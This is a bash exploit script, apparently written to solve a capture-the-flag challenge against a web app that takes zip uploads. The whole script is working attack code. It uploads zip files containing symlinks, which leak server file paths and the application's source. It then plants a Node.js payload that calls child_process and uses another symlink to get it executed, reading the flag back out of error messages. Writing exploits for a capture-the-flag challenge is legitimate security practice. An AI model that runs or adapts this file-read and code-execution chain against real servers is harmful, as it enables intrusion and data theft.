#!/bin/bash
if [ -z "$1" ]; then
  echo "usage: ./exploit.sh URL";
  exit 0;
fi

#PROXY="-x http://127.0.0.1:8080/"
set -ex

URL=$(echo "$1"|sed -E 's|/+$||g');

# disclose where app.js is
echo "[-] cleaning files";
echo "[-] finding main js";
rm -rf ./files/;
mkdir -p ./files;
echo $'{"type":"yaml","files":["petstore.json"]}' > ./files/info.json;
ln -s /this/does/not/exist ./files/petstore.json;
cd ./files;
zip --symlinks -r test.zip . >/dev/null;
cd ../;
res=$(curl --insecure $PROXY --silent -X POST -F "zipfile=@./files/test.zip;type=application/zip" "$URL/upload");
app_js_location="$(echo $res | cut -d '(' -f3 | cut -d ':' -f1;)";
echo "[-] main js found at: $app_js_location";

# leak app.js
echo "[-] leaking app.js";
rm -rf ./files/;
mkdir -p ./files;
echo $'{"type":"yaml","files":["petstore.json"]}' > ./files/info.json;
ln -s "$app_js_location" ./files/petstore.json;
cd ./files;
zip --symlinks -r test.zip . >/dev/null;
cd ../;
res=$(curl --insecure $PROXY --silent -X POST -F "zipfile=@./files/test.zip;type=application/zip" "$URL/upload");
source=$(echo $res | awk -F"YAML: " '{ print $2$3 }' | awk -F"YAMLException" '{ print $1 }');
echo "[-] source:  ${source:0:60}...";

# plant payload
echo "[-] planting payload";
rm -rf ./files/;
mkdir -p ./files;
cd ./files;
echo $'throw new Error(require("child_process").spawnSync("/flagout",[]).stdout.toString());' > ./test.zip;
cd ../;
res=$(curl --insecure $PROXY --silent -X POST -F "zipfile=@./files/test.zip;type=application/zip" "$URL/upload");
payload_location=$(echo $res | awk -F"zip error in " '{ print $2 }' | cut -d ':' -f1);
echo "[-] payload planted at:  $payload_location";

# execute payload
echo "[-] executing payload";
rm -rf ./files/;
mkdir -p ./files;
echo $'{"type":"json","files":["petstore.json"]}' > ./files/info.json;
ln -s "$payload_location" ./files/petstore.json;
cd ./files;
zip --symlinks -r test.zip . >/dev/null;
cd ../;
res=$(curl --insecure $PROXY --silent -X POST -F "zipfile=@./files/test.zip;type=application/zip" "$URL/upload");
flag=$(echo $res | awk -F"Error: " '{ print $2 }' | cut -d '\' -f1);
echo "[!] flag: $flag";
rm -rf ./files/;
